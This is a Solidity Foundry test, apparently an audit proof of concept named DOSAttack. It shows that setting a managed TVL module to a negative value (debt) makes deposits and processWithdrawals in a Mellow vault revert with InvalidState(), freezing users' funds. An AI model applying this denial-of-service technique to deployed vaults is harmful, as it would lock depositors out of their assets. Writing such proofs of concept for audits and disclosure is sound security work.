// SPDX-License-Identifier: BSL-1.1
pragma solidity 0.8.25;

import "@mellow/tests/mainnet/Constants.sol";
import "./helper.sol";
import "@mellow/tests/mainnet/unit/VaultTestCommon.t.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract DOSAttack is Helper {
    // DOS attack when  calling processWithdrawals removeToken , deposit, emergencyWithdraw if we have debt in the system
    function test_DOS_when_debt() public {
        vaultDeployment(admin);
        tvlModuleDeployment(admin);
        addToken(admin);
        setupOracle(admin);
        _setupDepositPermissions(admin);
        // unlockDeposit(admin);
        address[] memory tvlModules = vault.tvlModules();

        /*  erc20TvlModule 0
        defaultBondTvlModule 1 
        managedTvlModule 2 
         */

        setupBondModule(admin, tvlModules[1], 100 ether);
        setTVLPositive(admin, ManagedTvlModule(tvlModules[2]));
        setupModuleEr20(operator);
        {
            (address[] memory tokens, uint256[] memory amounts) = vault.underlyingTvl();
            assertEq(tokens.length, 3);
            assertEq(amounts.length, 3);
            assertEq(tokens[0], Constants.WSTETH);
            assertEq(tokens[1], Constants.RETH);
            assertEq(tokens[2], Constants.WETH);

            /// let's deposit for one1 token
            address depositor = address(bytes20(keccak256("depositor")));

            uint256[] memory amountsToDeposit = new uint256[](3);
            amountsToDeposit[0] = 10 ether;
            address[] memory tokensToDeposit = new address[](1);
            tokensToDeposit[0] = Constants.WSTETH;
            {
                // unlock
                (uint256[] memory actualAmounts, uint256 lpAmount) =
                    dealDeposit(operator, address(vault), tokensToDeposit, amountsToDeposit, amountsToDeposit[0]);
                console2.log("lpAmount", lpAmount / 1 ether);
            }
            // normal deposit
            {
                (uint256[] memory actualAmounts, uint256 lpAmount) =
                    dealDeposit(depositor, depositor, tokensToDeposit, amountsToDeposit, 100);
                console2.log("lpAmount", lpAmount);
            }
            // now let's add debt to tvl
            setTVLNegative(admin, ManagedTvlModule(tvlModules[2]));

            {
                address depositor2 = address(bytes20(keccak256("depositor2")));

                vm.startPrank(depositor2);
                for (uint256 i = 0; i < tokensToDeposit.length; i++) {
                    deal(tokensToDeposit[i], depositor2, amountsToDeposit[i]);
                    IERC20(tokensToDeposit[i]).approve(address(vault), amountsToDeposit[i]);
                }
                vm.expectRevert(abi.encodeWithSignature("InvalidState()"));
                (uint256[] memory actualAmounts, uint256 lpAmount) =
                    vault.deposit(depositor2, amountsToDeposit, 1, type(uint256).max, 0);
                vm.stopPrank();
                console2.log("lpAmount", lpAmount);
            } // lp token amount will increase

            //regiser withdraw
            registerWithdrawing(
                depositor, vault.balanceOf(depositor), amountsToDeposit, type(uint256).max, type(uint256).max, false
            );
            vm.startPrank(operator);
            address[] memory users = new address[](1);
            users[0] = depositor;
            vm.expectRevert(abi.encodeWithSignature("InvalidState()"));
            vault.processWithdrawals(users);
            vm.stopPrank();
        }
    }
}
